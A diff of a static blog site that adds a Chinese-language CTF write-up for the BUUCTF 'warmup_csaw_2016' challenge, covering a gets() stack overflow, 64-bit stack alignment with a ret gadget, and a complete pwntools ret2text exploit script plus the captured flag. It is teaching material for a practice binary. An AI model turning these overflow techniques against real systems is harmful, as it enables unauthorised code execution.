@@ -78,7 +78,7 @@
     
     <!--- Seo Part-->
     
-    <link rel="canonical" href="http://example.com/404.html"/>
+    <link rel="canonical" href="http://example.com/2026/05/09/warmup-csaw-2016/"/>
     <meta name="robots" content="index,follow">
     <meta name="googlebot" content="index,follow">
     <meta name="revisit-after" content="1 days">
@@ -86,14 +86,21 @@
     
         
         <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
-<meta property="og:type" content="website">
-<meta property="og:title" content="Page Not Found">
-<meta property="og:url" content="http://example.com/404.html">
+<meta property="og:type" content="article">
+<meta property="og:title" content="warmup_csaw_2016 栈溢出与栈对齐踩坑">
+<meta property="og:url" content="http://example.com/2026/05/09/warmup-csaw-2016/index.html">
 <meta property="og:site_name" content="Bear">
 <meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="http://example.com/images/redefine-og.webp">
+<meta property="article:published_time" content="2026-05-09T20:44:00.000Z">
+<meta property="article:modified_time" content="2026-05-10T17:09:12.699Z">
 <meta property="article:author" content="B1ear">
+<meta property="article:tag" content="64位">
+<meta property="article:tag" content="ret2text">
+<meta property="article:tag" content="栈对齐">
+<meta property="article:tag" content="栈溢出">
+<meta property="article:tag" content="盲打">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="http://example.com/images/redefine-og.webp">
     
@@ -107,7 +114,7 @@
     
     <title>
         
-            Page Not Found | Bear
+            warmup_csaw_2016 栈溢出与栈对齐踩坑 | Bear
         
     </title>
 
@@ -416,13 +423,268 @@
 			
 
 			<div class="main-content">
-				<div class="nf-container">
-    <div class="nf-text">
-        <h1>404<br>Page Not Found</h1>
-    </div>
-    <div class="nf-button">
-        <a href="/" class="button large center"><i class="fa-regular fa-house"></i> Go Back Home</a>
-    </div>
+				<div class="post-page-container flex relative justify-between box-border w-full h-full">
+	<div class="article-content-container">
+
+		<div class="article-title relative w-full">
+			
+			<div class="w-full flex items-center pt-6 justify-start">
+				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">warmup_csaw_2016 栈溢出与栈对齐踩坑</h1>
+			</div>
+			
+		</div>
+
+		
+		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+			<div class="avatar w-[46px] h-[46px] shrink-0 rounded-medium border border-border-color p-px">
+				<img src="/images/avatar.jpg">
+			</div>
+			<div class="info flex flex-col justify-between">
+				<div class="author flex items-center">
+					<span class="name text-default-text-color text-lg font-semibold">B1ear</span>
+					
+				</div>
+				<div class="meta-info">
+					<div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2026-05-09 20:44</span>
+        <span class="mobile">2026-05-09 20:44</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2026-05-10 17:09:12</span>
+            <span class="mobile">2026-05-10 17:09:12</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/pwn/">pwn</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/64%E4%BD%8D/">64位</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">栈溢出</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/ret2text/">ret2text</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E6%A0%88%E5%AF%B9%E9%BD%90/">栈对齐</a>&nbsp;
+                    </li>
+                
+                    <li>
+                        | <a href="/tags/%E7%9B%B2%E6%89%93/">盲打</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+</div>
+
+				</div>
+			</div>
+		</div>
+		
+
+		
+
+
+		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+			<blockquote>
+<p>BUUCTF 入门题 | 64位栈对齐问题绕过与 pwntools 盲打技巧</p>
+</blockquote>
+<h2 id="0x01-题目环境"><a href="#0x01-题目环境" class="headerlink" title="0x01 题目环境"></a>0x01 题目环境</h2><table>
+<thead>
+<tr>
+<th>项目</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>平台</td>
+<td>BUUCTF</td>
+</tr>
+<tr>
+<td>架构</td>
+<td>64位 Linux ELF (amd64)</td>
+</tr>
+<tr>
+<td>保护机制</td>
+<td>Partial RELRO，无 Canary，无 PIE，存在 RWX 段</td>
+</tr>
+<tr>
+<td>核心考点</td>
+<td>栈溢出、ret2text、64位栈对齐、pwntools 盲打</td>
+</tr>
+</tbody></table>
+<h2 id="0x02-逆向分析"><a href="#0x02-逆向分析" class="headerlink" title="0x02 逆向分析"></a>0x02 逆向分析</h2><h3 id="漏洞定位"><a href="#漏洞定位" class="headerlink" title="漏洞定位"></a>漏洞定位</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">s= byte ptr -0Fh        ; 距离 rbp 偏移 -0xF (15字节)</span><br><span class="line">lea     rax, [rbp+s]</span><br><span class="line">call    _gets           ; 无边界检查</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="后门函数"><a href="#后门函数" class="headerlink" title="后门函数"></a>后门函数</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public fun              ; 地址 0x401186</span><br><span class="line">lea     rdi, command    ; &quot;/bin/sh&quot;</span><br><span class="line">call    _system</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>偏移量</strong>：<code>0xF</code> (15) + <code>8</code> (saved rbp) &#x3D; <strong>23 字节</strong></p>
+<h2 id="0x03-关键踩坑与解决方案"><a href="#0x03-关键踩坑与解决方案" class="headerlink" title="0x03 关键踩坑与解决方案"></a>0x03 关键踩坑与解决方案</h2><h3 id="坑-1：Ubuntu-18-04-system-栈对齐崩溃"><a href="#坑-1：Ubuntu-18-04-system-栈对齐崩溃" class="headerlink" title="坑 1：Ubuntu 18.04+ system() 栈对齐崩溃"></a>坑 1：Ubuntu 18.04+ system() 栈对齐崩溃</h3><p><strong>现象</strong>：Payload 发送成功，但程序直接崩溃退出。</p>
+<p><strong>原因</strong>：高版本 glibc 要求调用 <code>system</code> 时 <code>rsp</code> 必须 16 字节对齐，否则 <code>movaps</code> 指令崩溃。</p>
+<p><strong>解法</strong>：在后门地址前加一个 <code>ret</code> 指令，让 <code>rsp</code> 下移 8 字节重新满足对齐：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rop = ROP(elf)</span><br><span class="line">ret_addr = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p64(ret_addr) + p64(backdoor_addr)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="坑-2：recvuntil-死等导致-Payload-无法发送"><a href="#坑-2：recvuntil-死等导致-Payload-无法发送" class="headerlink" title="坑 2：recvuntil() 死等导致 Payload 无法发送"></a>坑 2：recvuntil() 死等导致 Payload 无法发送</h3><p><strong>现象</strong>：脚本卡在 <code>io.recvuntil(b&quot;please input\n&quot;)</code> 处。</p>
+<p><strong>原因</strong>：网络 I&#x2F;O 缓冲或远程输出格式与预期不匹配导致死锁。</p>
+<p><strong>解法（盲打法）</strong>：删除 <code>recvuntil</code>，用 <code>sleep(0.5)</code> 等待连接建立后直接发送：</p>
+<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload)</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x04-Exploit-代码"><a href="#0x04-Exploit-代码" class="headerlink" title="0x04 Exploit 代码"></a>0x04 Exploit 代码</h2><div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn1&#x27;</span>)</span><br><span class="line">io = remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>, <span class="number">27853</span>) </span><br><span class="line"></span><br><span class="line">backdoor_addr = <span class="number">0x401186</span> </span><br><span class="line">offset = <span class="number">15</span> + <span class="number">8</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 自动寻找 ret 指令用于栈对齐</span></span><br><span class="line">rop = ROP(elf)</span><br><span class="line">ret_addr = rop.find_gadget([<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">log.success(<span class="string">f&quot;Found clean &#x27;ret&#x27; gadget at: <span class="subst">&#123;<span class="built_in">hex</span>(ret_addr)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Padding + 栈对齐 ret + 后门地址</span></span><br><span class="line">payload = <span class="string">b&#x27;A&#x27;</span> * offset + p64(ret_addr) + p64(backdoor_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 盲发 Payload</span></span><br><span class="line">sleep(<span class="number">0.5</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x05-执行结果"><a href="#0x05-执行结果" class="headerlink" title="0x05 执行结果"></a>0x05 执行结果</h2><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Flag: flag&#123;4b0a4509-6474-4e1d-82aa-d76df3bbd675&#125;</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="0x06-核心考点"><a href="#0x06-核心考点" class="headerlink" title="0x06 核心考点"></a>0x06 核心考点</h2><ul>
+<li><strong>64位栈对齐</strong>：glibc 2.27+ 调用 <code>system</code> 需要 <code>rsp</code> 16 字节对齐</li>
+<li><strong>ret 滑板</strong>：利用 <code>ret</code> 指令调整栈指针</li>
+<li><strong>盲打法</strong>：当 <code>recvuntil</code> 死等时，用 <code>sleep</code> + 直接发送绕过</li>
+<li><strong>ROPgadget</strong>：<code>ROP(elf).find_gadget([&#39;ret&#39;])[0]</code> 自动寻找 gadget</li>
+</ul>
+
+		</div>
+
+		
+		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+			<div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> warmup_csaw_2016 栈溢出与栈对齐踩坑</li>
+        <li><strong>Author:</strong> B1ear</li>
+        <li><strong>Created at
+                :</strong> 2026-05-09 20:44:00</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2026-05-10 17:09:12
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://b1ear.github.io/2026/05/09/warmup-csaw-2016/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+
+            
+                This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a>.
+            
+        </li>
+    </ul>
+</div>
+
+		</div>
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/64%E4%BD%8D/">#64位</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/">#栈溢出</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/ret2text/">#ret2text</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E6%A0%88%E5%AF%B9%E9%BD%90/">#栈对齐</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/%E7%9B%B2%E6%89%93/">#盲打</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2026/05/09/ret2shellcode/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">ret2shellcode 栈地址泄露与代码注入</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2026/05/09/jarvisoj-level2-ret2libc/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">jarvisoj_level2 32位 ret2libc 栈溢出</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">warmup_csaw_2016 栈溢出与栈对齐踩坑</div>
+		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01-%E9%A2%98%E7%9B%AE%E7%8E%AF%E5%A2%83"><span class="nav-text">0x01 题目环境</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-text">0x02 逆向分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%BC%8F%E6%B4%9E%E5%AE%9A%E4%BD%8D"><span class="nav-text">漏洞定位</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8E%E9%97%A8%E5%87%BD%E6%95%B0"><span class="nav-text">后门函数</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x03-%E5%85%B3%E9%94%AE%E8%B8%A9%E5%9D%91%E4%B8%8E%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88"><span class="nav-text">0x03 关键踩坑与解决方案</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-1%EF%BC%9AUbuntu-18-04-system-%E6%A0%88%E5%AF%B9%E9%BD%90%E5%B4%A9%E6%BA%83"><span class="nav-text">坑 1：Ubuntu 18.04+ system() 栈对齐崩溃</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%9D%91-2%EF%BC%9Arecvuntil-%E6%AD%BB%E7%AD%89%E5%AF%BC%E8%87%B4-Payload-%E6%97%A0%E6%B3%95%E5%8F%91%E9%80%81"><span class="nav-text">坑 2：recvuntil() 死等导致 Payload 无法发送</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x04-Exploit-%E4%BB%A3%E7%A0%81"><span class="nav-text">0x04 Exploit 代码</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x05-%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9E%9C"><span class="nav-text">0x05 执行结果</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x06-%E6%A0%B8%E5%BF%83%E8%80%83%E7%82%B9"><span class="nav-text">0x06 核心考点</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
 </div>
 
 			</div>
@@ -460,6 +722,22 @@
 		</div>
 	</div>
 
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
 	
 
 	<div class="right-side-tools-container">
@@ -584,6 +862,7 @@
         }),
     );
 </script>
+
 
 
 
